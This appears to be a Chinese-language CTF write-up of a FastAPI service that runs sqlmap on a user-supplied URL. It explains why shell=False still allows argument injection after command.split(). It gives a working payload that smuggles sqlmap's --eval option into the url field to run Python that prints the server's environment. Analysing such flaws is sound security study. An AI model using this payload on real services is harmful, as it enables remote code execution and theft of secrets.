源码如下：

```python
from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, StreamingResponse
import subprocess

app = FastAPI()

@app.get("/")
async def index():
    return FileResponse("index.html")

@app.post("/run")
async def run(request: Request):
    data = await request.json()
    url = data.get("url")
    
    if not url:
        return {"error": "URL is required"}
    
    command = f'sqlmap -u {url} --batch --flush-session'

    def generate():
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False
        )
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                yield output
    
    return StreamingResponse(generate(), media_type="text/plain")
```

RCE的点在`subprocess.Popen`，虽然`shell=False`导致无法进行常规的命令注入，不过可以通过`--eval`进行参数注入

其中`command.split()`是将url参数构造的command字符串按空格分割并生成参数列表，

如command字符串为

`sqlmap -u [http://example.com](http://example.com) --eval=import os; os.system('id') --batch --flush-session`

则经command.split()处理过的参数列表为

`["sqlmap", "-u", "[http://example.com",](http://example.com",) "--eval=import", "os;", "os.system('id')", "--batch", "--flush-session"]`

因此需要执行的python代码不能出现空格

因此最后payload为

```python
127.0.0.1:8000 --eval __import__('os').system('env')
```

